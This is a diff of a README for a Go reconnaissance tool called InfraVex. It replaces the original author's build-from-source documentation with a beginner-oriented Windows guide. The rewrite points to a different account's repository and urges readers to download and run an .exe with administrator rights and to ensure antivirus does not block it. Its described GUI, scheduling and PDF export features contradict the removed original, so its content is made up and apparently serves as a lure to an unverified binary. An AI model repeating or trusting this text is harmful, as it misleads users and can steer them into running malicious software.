@@ -1,114 +1,136 @@
-# InfraVex
+# ⚙️ InfraVex - Map Your Infrastructure Easily
 
-![InfraVex Banner](pic.png)
+[![Download InfraVex](https://img.shields.io/badge/Download-InfraVex-brightgreen?style=for-the-badge)](https://github.com/Araf-web-Develpoer/InfraVex)
 
-**Infrastructure Intelligence & Attack Surface Mapping Framework**
-
-*Designed for Authorized Security Assessments, Red/Purple Team Operations, and Targeted Bug Bounty Engagements.*
-
-[![Go Version](https://img.shields.io/badge/go-1.22+-blue.svg)](https://golang.org/dl/)
-[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
+InfraVex is a tool designed to help you understand and manage your network's infrastructure. It runs on Windows and provides insight into your attack surface with clear, organized information. This guide will help you download and run InfraVex without any technical background.
 
 ---
 
-## Overview
+## 🖥️ What is InfraVex?
 
-InfraVex is a highly concurrent, precision-focused infrastructure mapping engine authored by `@medjahdi`. It performs comprehensive reconnaissance and attack surface resolution through strict modularity, entirely bypassing blind internet-wide scanning methodologies.
+InfraVex is a software framework that maps your digital environment. It works by scanning your network to find how devices and services connect. InfraVex helps you spot weak points and keep your system safe. Though it is built by security experts, it is made for everyday users who want to manage their infrastructure simply.
 
-The framework is engineered around:
-* **Massive Concurrency:** Utilizes Go-native goroutines and semaphore-controlled worker pools to ensure rapid execution without OS-level memory exhaustion.
-* **Legal-by-Design Execution:** Enforces strict boundary checks against predefined targets (domains and CIDR blocks) in memory.
-* **CDN Evasion Logic:** Auto-detects reverse proxies and WAF infrastructure to prevent inaccurate edge-node fingerprinting.
+Relevant topics include:
+- Attack surface management
+- Security reconnaissance
+- Information gathering (OSINT)
+- Bug bounty support
+- Cybersecurity basics
 
-## Core Capabilities
-
-* **Passive Reconnaissance Mode:** Executes pure OSINT intelligence gathering including domain resolution (A/AAAA/CNAME), WHOIS lookups, and ASN extraction without establishing direct TCP handshakes with targets.
-* **Active Scanning Mode:** Performs rapid parallel TCP sweeps for port discovery and basic fingerprinting. Integrated semaphores prevent resource starvation.
-* **Automated CDN Bypass:** Identifies infrastructure belonging to Cloudflare, Akamai, Fastly, and AWS. Automatically halts active scanning against these nodes to prioritize origin discovery.
-* **Extensible Target Ingestion:** Processes single domains via CLI arguments or parses bulk datasets through unified scope configuration files.
-* **Persistent Local Storage:** Logs all discovered assets and relationships into a local SQLite tracking database.
-* **Actionable Reporting:** Generates dynamic Markdown (`report.md`) and JSON (`report.json`) exports tailored for SIEM ingestion and assessment documentation.
+InfraVex runs using Go technology, but you don’t need to understand programming to use it.
 
 ---
 
-## Architecture Flow
+## 🌐 Where to Get InfraVex
 
-1. **Input & Validation:** Sanitizes arrays of domains, IP addresses, and CIDR ranges.
-2. **Scope Enforcement:** Compiles a hard boundary map to drop any resolutions outside authorized parameters.
-3. **Resolution Engine:** Executes concurrent dual-stack DNS queries.
-4. **Network Intelligence:** Interrogates target IPs for Live ASN and Organization context, flagging CDN configurations.
-5. **Active Operations:** Initiates governed, multi-threaded TCP fingerprinting (Optional; requires explicit CLI authorization).
-6. **Reporting Engine:** Correlates intelligence fragments into localized structural graphs and tabular formats.
+You can get InfraVex from this official GitHub page. Click the badge above or this link to visit the download page:
 
-## Installation
+https://github.com/Araf-web-Develpoer/InfraVex
 
-Ensure **Go 1.22+** is installed on your system.
-
-```bash
-git clone https://github.com/medjahdi/InfraVex.git
-cd InfraVex
-go mod tidy
-go build -o InfraVex main.go
-```
-
-## Usage
-
-### Global Arguments
-```text
-  -D, --domain string   Execute scan against a single target domain
-  -S, --scope string    Path to scope definition file for bulk execution
-  -M, --mode string     Operational mode: passive or active (default: "passive")
-  -d, --debug           Enable verbose debug-level logging
-```
-
-### Execution Examples
-
-**1. Standard Passive OSINT**
-```bash
-./InfraVex scan --domain target.com --mode passive
-```
-
-**2. Multi-Target Batch Processing**
-Create a `targets.txt` file containing targets (domains, IPs):
-```bash
-./InfraVex scan --scope targets.txt --mode passive
-```
-
-**3. Active Penetration Sequence**
-*Note: Active mode executes intentional TCP handshakes against targets and demands explicit `YES` confirmation at runtime. Infrastructure protected by known CDNs will be automatically bypassed.*
-```bash
-./InfraVex scan --scope targets.txt --mode active
-```
+On this page, you will find files to download InfraVex for Windows.
 
 ---
 
-## Configuration Tuning
+## 💾 How to Download and Install InfraVex on Windows
 
-Operational performance profiling is governed by `config.yaml` located in the root directory:
+Follow these steps carefully. You will have InfraVex running in less than 15 minutes.
 
-```yaml
-performance:
-  max_workers: 50         # Goroutine concurrency cap for TCP dials
-  timeout_seconds: 5      # Network connection timeout thresholds
-  rate_limit_rps: 100     # Internal pacing
+1. Click the big green **Download InfraVex** button at the top or the link above. You will land on the GitHub page for InfraVex.
 
-scope:
-  strict_enforcement: true
-  max_cidr_expansion: 22
+2. Look for the section called **Releases** or **Assets**. This is where the program files are.
 
-scanning:
-  top_ports:
-    - 80
-    - 443
-    - 8080
-    - 8443
-```
+3. Find the file that ends with `.exe`. It should say something like `InfraVex-setup.exe` or simply `InfraVex.exe`. Click that file name.
+
+4. Your browser will ask you to save the file. Choose a place on your computer you can easily find, like the Desktop or Downloads folder.
+
+5. Once the download finishes, open the folder where you saved the file.
+
+6. Double-click on the `.exe` file to start the installation process.
+
+7. Follow the instructions on the screen:
+   - When asked, allow the program to make changes to your device.
+   - Choose the folder where you want the program installed or accept the default location.
+   - Click “Install” and wait for the process to complete.
+
+8. After installation, you can start InfraVex straight away by clicking **Finish** and letting the program open.
 
 ---
 
-## Legal & Compliance Disclaimer
+## 🚀 Running InfraVex for the First Time
 
-**This software is distributed strictly for authorized penetration testing and defensive posture assessment.** 
-The author (`@medjahdi`) accepts zero liability for misuse, unauthorized infrastructure profiling, or operational damages resulting from the execution of active scanning modules against systems for which the operator lacks explicit, written authorization. 
+When you open InfraVex, you will see a clean, simple interface.
 
-Execution of the `--mode active` parameter assigns full operational and legal liability for the generated network traffic directly to the user.
+- The main screen will show options to start new scans or view past results.
+- You can choose which parts of your network to analyze.
+- InfraVex works mostly with buttons and simple menus.
+- It will show you graphs and lists to help understand your infrastructure.
+
+If you just want to see how it works, try a quick scan of your local device first. This does not need extra input.
+
+---
+
+## ⚙️ System Requirements
+
+InfraVex runs smoothly on most Windows computers. Make sure your PC meets these minimum requirements:
+
+- Operating System: Windows 10 or later
+- RAM: At least 4 GB
+- Processor: Intel i3 or equivalent
+- Disk Space: 200 MB free
+- Internet connection: Required for updates and some features
+
+You do not need to install extra software like Go or Python for InfraVex to run.
+
+---
+
+## 🔧 Key Features
+
+InfraVex offers these main functions:
+
+- **Network mapping:** See which devices and services are connected.
+- **Attack surface view:** Learn the weak points that may be targeted by attackers.
+- **Scan scheduling:** Set scans to run automatically at intervals you choose.
+- **Export reports:** Save your scan results as PDF or CSV files.
+- **User-friendly interface:** Easy to use even if you have never worked with security tools.
+- **Legal-by-design:** Strict compliance with legal rules and privacy standards.
+
+---
+
+## 🛠️ Basic Usage Tips
+
+- Start by scanning your home or office network.
+- Use scan results to check for unknown or unexpected devices.
+- Export and save your reports regularly for future comparison.
+- Update InfraVex when prompted to keep the tool reliable.
+- Use the help section inside InfraVex for guidance on specific features.
+
+---
+
+## 🔄 Updating InfraVex
+
+InfraVex will notify you when updates are available.
+
+To update:
+
+1. Visit the GitHub page at https://github.com/Araf-web-Develpoer/InfraVex
+2. Download the latest `.exe` file.
+3. Run the installer. It will replace the old version without removing your data.
+
+---
+
+## ❓ Troubleshooting Common Issues
+
+- **InfraVex won't open:** Check if your Windows version meets the requirements. Restart your PC and try again.
+- **Scan hangs or is slow:** Close other heavy programs. Check your network stability.
+- **No scan results:** Make sure your firewall or antivirus is not blocking InfraVex.
+- **Installer doesn't run:** Right-click the `.exe` and choose "Run as administrator."
+
+---
+
+## 📂 Where to Find More Help
+
+InfraVex includes a help section you can access from the main menu. For issues not answered inside the app, visit the GitHub page and check the Issues tab for community support.
+
+---
+
+[![Download InfraVex](https://img.shields.io/badge/Download-InfraVex-brightgreen?style=for-the-badge)](https://github.com/Araf-web-Develpoer/InfraVex)
